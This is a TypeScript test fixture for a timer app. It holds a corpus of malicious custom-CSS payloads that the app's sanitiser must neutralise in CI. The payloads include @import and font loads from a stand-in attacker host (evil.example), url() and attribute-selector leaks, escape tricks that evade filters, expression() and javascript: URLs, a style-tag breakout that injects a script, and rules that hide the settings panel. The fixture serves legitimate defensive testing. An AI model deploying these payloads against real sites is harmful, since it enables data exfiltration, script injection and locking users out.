/**
 * The malicious-CSS corpus (plan, Custom CSS safety, defence 12): custom CSS
 * written to load something, leak something, run something, escape the timer
 * view, or lock the user out. Each entry is saved through the editor in CI,
 * and must be fully neutralised: no request, no CSP violation, nothing kept
 * that names a resource, and the settings panel still usable above the timer.
 *
 * Addresses under /leak/ are the site's own origin, which the CSP allows for
 * images, so only the checker stands between them and a request; those on
 * evil.example are also blocked by the CSP.
 */

const PNG_1PX = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
/** A data image over the 8 KB limit. */
const BIG_DATA_IMAGE = `data:image/png;base64,${PNG_1PX}${'A'.repeat(12_000)}`;
const SCRIPT_SCHEME = ['java', 'script:'].join('');

export interface HostileCss {
  readonly name: string;
  readonly css: string;
}

export const MALICIOUS_CSS: readonly HostileCss[] = [
  // Loading other stylesheets and fonts.
  { name: '@import from another site', css: '@import url(https://evil.example/steal.css);' },
  { name: '@import from the site itself', css: '@import "/leak/import.css";' },
  { name: '@import with an escaped name', css: '@\\69mport url(/leak/escaped-import.css);' },
  { name: '@import into a layer', css: '@import url(/leak/layer.css) layer(user);' },
  { name: '@import nested in @media', css: '@media all { @import url(/leak/nested-import.css); }' },
  { name: '@font-face from the site', css: '@font-face { font-family: leak; src: url(/leak/font.woff2); } .time { font-family: leak }' },
  { name: '@font-face from another site', css: '@font-face { font-family: far; src: url(https://evil.example/font.woff2); } .time { font-family: far }' },
  { name: '@namespace', css: '@namespace url(http://www.w3.org/1999/xhtml); .time { opacity: .9 }' },
  { name: '@property with a URL', css: '@property --leak { syntax: "<image>"; inherits: false; initial-value: url(/leak/property.png); } .screen { background-image: var(--leak) }' },
  { name: '@counter-style symbols', css: '@counter-style leak { system: cyclic; symbols: url(/leak/counter.png); } .time { display: list-item; list-style: leak inside }' },
  { name: '@page and @font-feature-values', css: '@page { margin: 0 } @font-feature-values Arial { @styleset { leak: 1 } }' },

  // Loading images: every url() that is not a small data image.
  { name: 'a background from another site', css: '.screen { background: url(https://evil.example/a.png) }' },
  { name: 'a background from the site', css: '.screen { background-image: url(/leak/background.png) }' },
  { name: 'reading the page through attribute selectors', css: '.screen[data-mode^="d"] { background: url(/leak/mode-d) } .screen[data-mode^="r"] { background: url(/leak/mode-r) }' },
  { name: 'an escaped url()', css: '.screen { background: \\75 rl(/leak/escaped-url) }' },
  { name: 'an escaped property name', css: '.screen { b\\61 ckground: url(/leak/escaped-property) }' },
  { name: 'a URL in a custom property', css: '.screen { --leak: url(/leak/variable); background-image: var(--leak) }' },
  { name: 'a URL built from a variable', css: '.screen { --part: "/leak/built"; background-image: url(var(--part)) }' },
  { name: 'image-set()', css: '.screen { background-image: image-set("/leak/set.png" 1x) }' },
  { name: '-webkit-image-set()', css: '.screen { background-image: -webkit-image-set(url(/leak/webkit-set.png) 1x) }' },
  { name: 'image() and cross-fade()', css: '.screen { background-image: image("/leak/image.png") } .time { background-image: cross-fade(url(/leak/a.png), url(/leak/b.png), 50%) }' },
  { name: 'src()', css: '.screen { background-image: src("/leak/src.png") }' },
  { name: 'a cursor', css: '.screen { cursor: url(/leak/cursor.cur), auto }' },
  { name: 'generated content', css: '.time::after { content: url(/leak/content.png) }' },
  { name: 'a border image', css: '.screen { border: 4px solid; border-image: url(/leak/border.png) 30 round }' },
  { name: 'a mask', css: '.screen { mask-image: url(/leak/mask.png) }' },
  { name: 'an SVG filter', css: '.screen { filter: url(/leak/filter.svg#f) }' },
  { name: 'an SVG data image that loads more', css: `.screen { background: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image href='/leak/svg-inner'/></svg>") }` },
  { name: 'a data image over the limit', css: `.screen { background-image: url("${BIG_DATA_IMAGE}") }` },
  { name: 'a URL in @media', css: '@media (min-width: 1px) { .screen { background: url(/leak/media.png) } }' },
  { name: 'a URL in nested rules', css: '@supports (display: grid) { .screen { & .time { background: url(/leak/nested.png) } } }' },
  { name: 'a URL in keyframes', css: '@keyframes leak { from { background-image: url(/leak/keyframe.png) } } .screen { animation: leak 1s infinite }' },
  { name: 'a URL in a container query', css: '@container style(--x: url(/leak/query)) { .time { color: red } }' },
  { name: 'a comment between url and its parenthesis', css: '.screen { background: url/**/(/leak/comment) }' },
  { name: 'attr() as a URL', css: '.screen { background-image: attr(data-mode type(<url>)) }' },

  // Running code.
  { name: 'expression(), behavior and -moz-binding', css: '.screen { width: expression(alert(1)); behavior: url(/leak/behavior.htc); -moz-binding: url(/leak/binding.xml) }' },
  { name: 'a script URL', css: `.screen { background: url(${SCRIPT_SCHEME}alert(1)) }` },
  { name: 'markup in the CSS', css: '</style><script>document.title="pwned"</script><style> .time::after { content: "<img src=/leak/markup onerror=alert(1)>" }' },

  // Escaping the timer view, and locking the user out.
  { name: 'closing the scope early', css: '} } } .settings { display: none !important } @layer user { @scope (.screen) { .time { color: red }' },
  { name: 'styling the panel through :root and body', css: ':root { --color-track: red } body .settings, html .settings { visibility: hidden !important }' },
  { name: 'covering the panel', css: '.screen { position: fixed !important; inset: 0; z-index: 2147483647 !important; display: contents } .time { position: fixed; inset: 0; z-index: 2147483647; background: red }' },
  { name: 'undoing the isolation of the view', css: ':scope { isolation: auto !important; display: contents !important; position: fixed !important; z-index: 2147483647 !important } .screen { position: fixed; z-index: 2147483647 }' },
  { name: 'nested scopes reaching out', css: '@scope (.settings) { :scope { display: none } } @scope (body) { .settings { display: none } }' },
];

/** Hides everything the user could reach in the timer view: settings still open with the comma key, and safe mode undoes it. */
export const LOCKOUT_CSS = '.corner, .controls { display: none !important } .time { opacity: 0 }';
